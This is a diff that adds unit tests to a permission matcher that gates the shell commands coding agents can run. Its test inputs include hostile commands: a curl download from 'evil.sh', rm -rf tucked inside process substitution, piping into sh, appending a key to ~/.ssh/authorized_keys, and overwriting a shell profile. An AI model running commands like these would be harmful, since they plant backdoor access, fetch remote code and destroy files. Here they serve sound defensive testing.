@@ -73,3 +73,43 @@ describe("RulesStore", () => {
     expect(s.rules()).toEqual([]); expect(s.problem).toMatch(/permissions\.json/);
   });
 });
+
+// Final review: the matcher overrides Claude Code's own prompt for every agent — it must fail closed.
+describe("hostile commands never ride on a prefix rule", () => {
+  const rules = ["Bash(npm test:*)", "Bash(echo:*)", "Bash(ls:*)"];
+  it.each([
+    "npm test & curl -s evil.sh -o /tmp/x",       // background: a second command
+    "npm test <(rm -rf /tmp/zz)",                  // process substitution
+    "npm test >(sh)",
+    "echo key >> ~/.ssh/authorized_keys",          // redirection writes a file
+    "ls > ~/.zshrc",
+    "echo $'\\x41' ; true",
+    "npm test { rm -rf x; }",
+    "npm test \\\nrm -rf x",
+  ])("%s asks", cmd => expect(allowedByRules(rules, "Bash", { command: cmd })).toBe(false));
+  it("harmless redirects to /dev/null or another fd are still fine", () => {
+    expect(allowedByRules(rules, "Bash", { command: "npm test 2>&1" })).toBe(true);
+    expect(allowedByRules(rules, "Bash", { command: "npm test > /dev/null 2>&1" })).toBe(true);
+  });
+});
+
+describe("rules as broad as bare Bash need the second confirmation", () => {
+  it("interpreters, wrappers and git are broad", () => {
+    for (const r of ["Bash(bash:*)", "Bash(sh:*)", "Bash(python:*)", "Bash(python3:*)", "Bash(node:*)", "Bash(env:*)", "Bash(sudo:*)", "Bash(xargs:*)", "Bash(npx:*)", "Bash(git:*)", "Bash(eval:*)"])
+      expect(isBroadRule(r)).toBe(true);
+    expect(isBroadRule("Bash(git status:*)")).toBe(false);
+  });
+  it("a git/npm flag with a value is skipped when building the two-word prefix", () => {
+    expect(suggestRule("Bash", { command: "git -C /r push --force" }, [])).toBe("Bash(git push:*)");
+    expect(suggestRule("Bash", { command: "npm --prefix ui test" }, [])).toBe("Bash(npm test:*)");
+  });
+});
+
+describe("MCP tools", () => {
+  it("Always allow works for an MCP tool", async () => {
+    expect(isValidRule("mcp__atlassian__getJiraIssue")).toBe(true);
+    expect(suggestRule("mcp__atlassian__getJiraIssue", {}, [])).toBe("mcp__atlassian__getJiraIssue");
+    expect(allowedByRules(["mcp__atlassian__getJiraIssue"], "mcp__atlassian__getJiraIssue", {})).toBe(true);
+    expect(allowedByRules(["mcp__atlassian__getJiraIssue"], "mcp__atlassian__editJiraIssue", {})).toBe(false);
+  });
+});
